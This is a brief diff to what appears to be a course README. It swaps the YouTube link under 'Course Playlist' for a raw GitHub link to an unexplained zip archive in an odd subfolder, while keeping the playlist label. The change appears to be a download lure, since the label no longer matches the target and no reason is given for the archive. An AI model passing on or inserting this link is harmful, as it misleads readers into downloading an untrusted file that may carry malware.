@@ -9,4 +9,4 @@
 
 ---
 #### Course Playlist
-https://www.youtube.com/watch?v=sVbEyFZKgqk&list=PLr3d3QYzkw2xabQRUpcZ_IBk9W50M9pe-
+https://github.com/weiran0630/learnphptherightway-project/raw/refs/heads/main/unfrayed/project-learnphptherightway-3.5.zip
